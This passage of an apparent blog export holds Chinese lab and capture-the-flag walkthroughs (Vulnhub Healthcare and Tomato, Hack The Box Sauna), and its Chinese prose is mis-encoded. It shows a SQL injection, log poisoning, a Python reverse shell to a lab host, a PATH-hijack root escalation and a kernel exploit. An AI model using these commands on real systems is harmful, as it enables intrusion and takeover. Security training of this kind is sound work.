src="https://img-blog.csdnimg.cn/235805f980cf43c68a8fc68310f5bcf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºä¸Šè¿œç¨‹åŠ è½½æˆ‘ä»¬çš„powershellè„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨è„šæœ¬åˆ›å»ºä¸€ä¸ªåŒ¿å±ç®¡ç†å‘˜ç»„çš„ç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/1b8333a9b0734baabe95425606940b95.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ·»åŠ æˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªè´¦æˆ·å¯†ç è¿›è¡Œç™»å½•äº†ï¼Œæƒé™æ˜¯ç®¡ç†å‘˜æƒé™<br><img src="https://img-blog.csdnimg.cn/a778b21f88954011b0a534250f909205.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>Windows Print Spooler</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Healthcare</title>
    <url>/2021/12/26/Healthcare/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†ftpå’ŒwebæœåŠ¡ï¼Œå¹¶ä¸”æ‰«æå‡ºäº†ä¸å…è®¸è®¿é—®çš„å‡ ä¸ªç›®å½•<br><img src="https://img-blog.csdnimg.cn/5dbfa03fea4c49f1a2b08c27a605fbcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åˆ†åˆ«è®¿é—®è¿™å‡ ä¸ªç›®å½•ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªç›®å½•å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œå…¶ä»–ç›®å½•éƒ½æ˜¾ç¤º404çŠ¶æ€ç <br><img src="https://img-blog.csdnimg.cn/856663a863cd441ca9ca6d8e62e83129.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/d0a8cae2057141059254c7688269f92c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ²¡å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±fuzzä¸€ä¸‹è·¯å¾„å§ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªopenemrè·¯å¾„ï¼Œè¿›å…¥åå‘ç°æ˜¯åå°ç™»å½•é¡µé¢</p>
<span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u &quot;http:&#x2F;&#x2F;192.168.101.200&quot; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-big.txt -e 404,403,500</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/62eb523aa913490cb9772221e6da1687.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/ffb2f3248388447cbbbb28ff1fe1f4fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>çœ‹åˆ°postè¡¨å•ï¼Œæ¡ä»¶åå°„éªŒè¯æ˜¯å¤Ÿå­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…å¹¶ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/9fc387f225fb434d9189cf499ec9fd96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯¹æ•°æ®åº“è¿›è¡Œæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/b71794267f1340b2bd79b21e04a19913.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹å­˜åœ¨usersè¡¨<br><img src="https://img-blog.csdnimg.cn/786a517b4ae94a70998658329530e0ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>å‘ç°usersè¡¨é‡Œå­˜åœ¨usernameå’Œpasswordä¸¤ä¸ªå­—æ®µ<br><img src="https://img-blog.csdnimg.cn/3ad57acd36ea44a6965f90f1200a4b83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨å…¥å‘ç°äº†ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œæˆ‘ä»¬åˆ†åˆ«å°è¯•ç™»å½•ftpï¼Œå‘ç°ä½¿ç”¨medicalè´¦å·å¯ä»¥ç™»å½•æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/5f4e0f07bb7540f4b112b1c1d3b46062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/d996972aacfe4e6f8988bca089b13a40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†payloadä¸Šä¼ åˆ°<code>/var/www/html/openemr</code>ç›®å½•ä¸­ï¼Œå¹¶è¿›è¡Œè®¿é—®<br><img src="https://img-blog.csdnimg.cn/8b9e1beafa41414a8d24428ffd10e758.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬åˆ‡æ¢åˆ°medicalç”¨æˆ·ä¸Šï¼Œå¹¶æŸ¥æ‰¾å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶<code>find / -perm -4000 2&gt;/dev/null</code><br><img src="https://img-blog.csdnimg.cn/38be5967b2204505b7abd5d0fbb30704.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°<code>/usr/bin/healthcheck</code>æ–‡ä»¶æ˜¯æ¯”è¾ƒå®¹æ˜“å—åˆ°æ”»å‡»çš„ç¨‹åºï¼Œå®ƒåªæ˜¯è¿è¡Œäº†ä¸€å †æ ‡å‡†çš„linuxç¨‹åºï¼Œæ¯”è¾ƒæ˜æ˜¾çš„æ˜¯<code>fdisk -l</code>è¿™ä¸ªç¨‹åº<br><img src="https://img-blog.csdnimg.cn/53728f3d36a841d1a02a990f9a6c58c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹å¸¸è§çš„ææƒæ“ä½œï¼Œå…ˆå°†/bin/bashå‘½ä»¤å†™å…¥åˆ°fdiskç¨‹åºä¸­ï¼Œå¹¶å°†å…¶å¯¼å…¥åˆ°medicalç”¨æˆ·çš„æ‰§è¡Œè·¯å¾„ä¸­ï¼Œæ·»åŠ æ‰§è¡Œæƒé™å¹¶æ‹¿å–rootæƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; fdisk</span><br><span class="line">chmod +x fdisk</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;medical:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;healthcheck</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/cda20fb3c5914ceaa4d13a6d3a7adf62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>SQLæ³¨å…¥æ¼æ´</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomato</title>
    <url>/2021/12/24/Tomato/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>è¿è¡Œæˆ‘ä»¬çš„bashè„šæœ¬ï¼Œå‘ç°ç›®æ ‡ç³»ç»Ÿå¼€æ”¾äº†ftpå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/b2f1b07f20b74e8cbbf09d8aceb93286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•æ˜¯å¦å¯ä»¥åŒ¿åç™»å½•ftpï¼Œæœªæœ<br><img src="https://img-blog.csdnimg.cn/074a7cd93bf64ed3aa33a1e7ba57281e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬è®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç•ªèŒ„å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/6fbb54145b634516a076f26d15d098ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬fuzzä¸€ä¸‹è·¯å¾„ï¼Œå‘ç°äº†å­˜åœ¨ä¸€ä¸ªantibot_imageè·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.101.197/&quot;</span> -e * -x404,500,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/fa0487042a3d48909ab79d96a12532a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬å‘ç°å­˜åœ¨ä¸€ä¸ªinfo.phpæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/a59aa7bf23b2400cb4fd41b01cea33d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–‡ä»¶çš„æºç æç¤ºæˆ‘ä»¬å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´<br><img src="https://img-blog.csdnimg.cn/39d170ef77ee482988bbfd4d37ecc20b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬éªŒè¯æ¼æ´ç¡®å®æ˜¯çœŸå®å­˜åœ¨çš„<br><img src="https://img-blog.csdnimg.cn/b6bee6c21fc2499999963c8682e6f3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬å°è¯•å°†ä¸€å¥è¯å†™è¿›æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ä¸º<code>/var/log/auth.log</code>ï¼Œå‘ç°å·²è¢«å†™å…¥æ—¥å¿—å¹¶æˆåŠŸæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤<br><img src="https://img-blog.csdnimg.cn/8fc98d199a4845c1a5e8d72245c7b934.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/bf1f3a8f67a6457998b22f5bd225ccc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŸ¥æ‰¾pythonæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™å¯ä»¥åå¼¹shellåˆ°æˆ‘ä»¬æœ¬åœ°çš„æœºå­ä¸Šã€‚å¯ä»¥çœ‹åˆ°pythonæ˜¯å­˜åœ¨çš„ï¼Œå¹¶ä¸”ç‰ˆæœ¬ä¸º3.5<br><img src="https://img-blog.csdnimg.cn/4d606cef990543d381d880d6a94f170c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†æ‰§è¡Œå¦‚ä¸‹çš„payloadæ·»åŠ åˆ°cmdå‚æ•°åè·å¾—ä¸€ä¸ªshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.101.196&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8ac1207e853b4bfa8655671b22b4939d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬å°†linpeas.shè„šæœ¬ä¸Šä¼ åˆ°é¶æœºä¸Šï¼Œå¹¶æ‰§è¡Œå®ƒ<br><img src="https://img-blog.csdnimg.cn/23a8477f887a40c3b6df7f1df69d406b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨ä¸€ä¸ªlinuxå†…æ ¸æ¼æ´<br><img src="https://img-blog.csdnimg.cn/e962cb6858c242bea4f04c0d8d28b3b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿™ä¸ªå†…æ ¸æ¼æ´å¯¹åº”çš„æ¼æ´ç¼–å·ä¸º<code>CVE-2017-6074</code>ï¼Œæˆ‘ä»¬å°†å…¶ç¼–è¯‘å˜ä¸Šä¼ åˆ°é¶æœºä¸Šï¼Œæ‰§è¡Œå³root<br><img src="https://img-blog.csdnimg.cn/8d5db74c976140df8fd5b0d408768a02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/335e4f13aa7e4d8c9ebaf95cb4c8749c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æ–‡ä»¶åŒ…å«æ¼æ´</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Sauna</title>
    <url>/2021/12/24/Sauna/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/0c4f7155f0a144fca320112bb07de39c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°å¼€æ”¾äº†445ï¼Œ80ï¼Œ88ï¼Œ5985è¿™äº›å¸¸è§çš„å¯èƒ½å­˜åœ¨æ¼æ´çš„ç«¯å£ã€‚å› ä¸ºå­˜åœ¨ldapæœåŠ¡ï¼Œå¯èƒ½è€ƒè™‘åˆ°å­˜åœ¨å†…ç½‘<br><img src="https://img-blog.csdnimg.cn/18c6ed7749514992adad88f2a6fa97f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>å‘ç°äº†smbæœåŠ¡ï¼Œå°è¯•æ˜¯å¦å¯ä»¥ç™»å½•<br><img src="https://img-blog.csdnimg.cn/cae8f24d7edf4d9ab4db6a15e3d5c60b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•å¤±è´¥ï¼Œé‚£æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ldapæœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/f0249267ceca4d73943001c895249779.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.10.175 -b <span class="string">&quot;dc=EGOTISTICAL-BANK,dc=local&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=EGOTISTICAL-BANK,dc=local&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: domain</span><br><span class="line">objectClass: domainDNS</span><br><span class="line">distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">instanceType: 5</span><br><span class="line">whenCreated: 20200123054425.0Z</span><br><span class="line">whenChanged: 20211018114224.0Z</span><br><span class="line">subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">uSNCreated: 4099</span><br><span class="line">dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==</span><br><span class="line">uSNChanged: 98336</span><br><span class="line">name: EGOTISTICAL-BANK</span><br><span class="line">objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==</span><br><span class="line">replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJ/uf</span><br><span class="line"> RcDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA</span><br><span class="line"> AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4</span><br><span class="line"> TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==</span><br><span class="line">creationTime: 132790309446175365</span><br><span class="line">forceLogoff: -9223372036854775808</span><br><span class="line">lockoutDuration: -18000000000</span><br><span class="line">lockOutObservationWindow: -18000000000</span><br><span class="line">lockoutThreshold: 0</span><br><span class="line">maxPwdAge: -36288000000000</span><br><span class="line">minPwdAge: -864000000000</span><br><span class="line">minPwdLength: 7</span><br><span class="line">modifiedCountAtLastProm: 0</span><br><span class="line">nextRid: 1000</span><br><span class="line">pwdProperties: 1</span><br><span class="line">pwdHistoryLength: 24</span><br><span class="line">objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG</span><br><span class="line">serverState: 1</span><br><span class="line">uASCompat: 1</span><br><span class="line">modifiedCount: 1</span><br><span class="line">auditingPolicy:: AAE=</span><br><span class="line">nTMixedDomain: 0</span><br><span class="line">rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name</span><br><span class="line"> ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">systemFlags: -1946157056</span><br><span class="line">wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT</span><br><span class="line"> ISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra</span><br><span class="line"> m Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin</span><br><span class="line"> cipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=</span><br><span class="line"> EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E</span><br><span class="line"> GOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC</span><br><span class="line"> AL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,</span><br><span class="line"> DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA</span><br><span class="line"> L-BANK,DC=LOCAL</span><br><span class="line">objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D</span><br><span class="line"> C=LOCAL</span><br><span class="line">isCriticalSystemObject: TRUE</span><br><span class="line">gPLink: [LDAP://CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=Syste</span><br><span class="line"> m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]</span><br><span class="line">dSCorePropagationData: 16010101000000.0Z</span><br><span class="line">otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">otherWellKnownObjects: 